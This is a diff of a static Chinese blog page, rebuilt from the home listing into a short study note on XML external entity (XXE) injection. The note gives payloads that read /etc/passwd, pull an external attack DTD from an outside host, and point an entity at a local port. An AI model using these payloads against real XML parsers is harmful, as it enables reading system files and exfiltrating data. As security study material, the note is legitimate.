@@ -54,32 +54,33 @@
   };
 </script>
 
-  <meta name="description" content="一个存放个人学习笔记的网站。">
-<meta name="keywords" content="Alairs,Alairs Notepad,Alair Lee">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Alairs Notepad">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="方法1：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;  方法2：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY % d SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&amp;gt; %d; ]&amp;gt;  其中attack.dtd的内容为： 1&amp;lt;!ENTIT">
+<meta name="keywords" content="xml,注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML实体注入漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/08/24/XML实体注入漏洞/index.html">
 <meta property="og:site_name" content="Alairs Notepad">
-<meta property="og:description" content="一个存放个人学习笔记的网站。">
+<meta property="og:description" content="方法1：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;  方法2：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY % d SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&amp;gt; %d; ]&amp;gt;  其中attack.dtd的内容为： 1&amp;lt;!ENTIT">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-24T05:14:53.716Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Alairs Notepad">
-<meta name="twitter:description" content="一个存放个人学习笔记的网站。">
-  <link rel="canonical" href="http://yoursite.com/">
+<meta name="twitter:title" content="XML实体注入漏洞">
+<meta name="twitter:description" content="方法1：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;  方法2：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY % d SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&amp;gt; %d; ]&amp;gt;  其中attack.dtd的内容为： 1&amp;lt;!ENTIT">
+  <link rel="canonical" href="http://yoursite.com/2019/08/24/XML实体注入漏洞/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome: true,
-    isPost: false,
+    isHome: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>Alairs Notepad</title>
+  <title>XML实体注入漏洞 | Alairs Notepad</title>
   <meta name="generator" content="Hexo 3.9.0">
   
 
@@ -215,10 +216,11 @@
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          <div id="content" class="content page-home">
+          <div id="content" class="content page-post-detail">
             
-  <section id="posts" class="posts-expand">
-      
+
+  <div id="posts" class="posts-expand">
+    
 
   <article class="post" itemscope itemtype="http://schema.org/Article">
   
@@ -237,9 +239,8 @@
       <meta itemprop="name" content="Alairs Notepad">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2019/08/24/XML实体注入漏洞/" class="post-title-link" itemprop="url">XML实体注入漏洞</a>
+        <h1 class="post-title" itemprop="name headline">XML实体注入漏洞
+
           
         </h1>
 
@@ -286,7 +287,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ]&gt;</span><br></pre></td></tr></table></figure>
+        <h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ]&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM "http://www.hackersb.cn/attack.dtd"&gt; %d; ]&gt;</span><br></pre></td></tr></table></figure>
 
@@ -311,229 +312,54 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "http://127.0.0.1:1234/"&gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Striker<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wechat</span>&gt;</span>strikersb<span class="tag">&lt;/<span class="name">wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">public_wechat</span>&gt;</span>sec_fe<span class="tag">&lt;/<span class="name">public_wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">website</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">website</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-        
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-          <div class="post-eof"></div>
         
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
       
 
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/23/sslscan/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Alair Lee">
-      <meta itemprop="description" content="一个存放个人学习笔记的网站。">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Alairs Notepad">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2019/08/23/sslscan/" class="post-title-link" itemprop="url">Linux安装sslscan</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2019-08-23 23:52:08" itemprop="dateCreated datePublished" datetime="2019-08-23T23:52:08+08:00">2019-08-23</time>
-            </span>
+      <footer class="post-footer">
           
             
-
+          
+          <div class="post-tags">
             
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-08-24 00:19:35" itemprop="dateModified" datetime="2019-08-24T00:19:35+08:00">2019-08-24</time>
-              </span>
+              <a href="/tags/xml/" rel="tag"># xml</a>
             
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
+              <a href="/tags/注入/" rel="tag"># 注入</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a></span>
-
-                
-                
+                <a href="/2019/08/23/sslscan/" rel="next" title="Linux安装sslscan">
+                  <i class="fa fa-chevron-left"></i> Linux安装sslscan
+                </a>
               
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib:"></a>安装zlib:</h2><blockquote>
-<p>zlib官网：<a href="http://zlib.net/" target="_blank" rel="noopener">http://zlib.net/</a></p>
-</blockquote>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/08/23/sslscan/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
             </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
+            <span class="post-nav-divider"></span>
 
-    
-      
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/23/preface/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Alair Lee">
-      <meta itemprop="description" content="一个存放个人学习笔记的网站。">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Alairs Notepad">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2019/08/23/preface/" class="post-title-link" itemprop="url">前言</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
+            <div class="post-nav-prev post-nav-item">
               
-                
-              
-
-              <time title="创建时间：2019-08-23 21:32:06 / 修改时间：23:37:56" itemprop="dateCreated datePublished" datetime="2019-08-23T21:32:06+08:00">2019-08-23</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/关于/" itemprop="url" rel="index"><span itemprop="name">关于</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>好记性不如烂笔头</strong>，学习再多的技术，了解再多的知识，也不如自己写一写。在这个信息技术发达的时代，我们所知的我接触的技术，信息多得让我们眼花缭乱。作为一个萌新的网络行业的工作者，也渐渐的意识到，要想提升自己的工作效</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/08/23/preface/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
             </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
+          </div>
         
       </footer>
+    
   </div>
   
   
   
   </article>
 
-    
-  </section>
-
-  
+  </div>
 
 
           </div>
@@ -552,6 +378,11 @@
 
   <aside id="sidebar" class="sidebar">
     <div class="sidebar-inner">
+        
+        
+        
+        
+      
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc" data-target="post-toc-wrap">
@@ -564,6 +395,10 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc">
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">2.</span> <span class="nav-text">方法2：</span></a></li></ol></div>
+          </div>
+        
       </div>
       <!--/noindex-->
 
@@ -722,5 +557,8 @@
 
 
   
+  <script src="/js/post-details.js?v=7.3.0"></script>
+
+
 </body>
 </html>
